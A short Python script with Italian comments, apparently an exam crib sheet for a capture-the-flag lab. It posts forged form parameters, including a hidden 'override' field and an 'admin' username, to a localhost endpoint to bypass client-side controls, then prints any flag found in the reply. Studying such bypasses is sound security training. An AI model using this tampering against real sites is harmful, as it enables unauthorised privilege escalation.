#!/usr/bin/env python3
"""
PRONTUARIO #12: Client-Side Controls & Hidden Fields Bypass
----------------------------------------------------------
Modulo: Web Security / Client-Side Validation Bypass
Descrizione: Script per la manipolazione e l'invio diretto di parametri
            bloccati o nascosti lato client (es. hidden fields, disabled attributes).
"""

import requests

# ==================== INPUT DATI D'ESAME ====================
TARGET_URL = "http://127.0.0.1:5000/submit"  # Endpoint di destinazione del form
# Parametri del form, inclusi quelli nascosti o manipolati (es. is_admin=true)
FORM_DATA = {
    "username": "admin",
    "role": "guest",       # Valore originario limitato dal client
    "override": "1"        # Parametro nascosto/aggiuntivo sbloccato via script
}
# ============================================================


def main():
    print(f"[*] Invio richiesta con parametri forgiati verso: {TARGET_URL}")
    print(f"[*] Payload inviato: {FORM_DATA}\n")

    try:
        # Invio della richiesta POST bypassando i controlli grafici del browser
        response = requests.post(TARGET_URL, data=FORM_DATA, timeout=5)
        
        print(f"[+] Codice Risposta HTTP: {response.status_code}")
        
        if "flag{" in response.text:
            print("=== BYPASS COMPLETATO CON SUCCESSO! ===")
            start_idx = response.text.find("flag{")
            end_idx = response.text.find("}", start_idx) + 1
            print(f" Flag Trovata: {response.text[start_idx:end_idx]}")
            print("========================================")
        else:
            print("[-] Risposta ricevuta ma nessuna flag trovata nel testo:")
            print(response.text[:300])

    except Exception as e:
        print(f"[!] Errore di connessione: {e}")


if __name__ == "__main__":
    main()
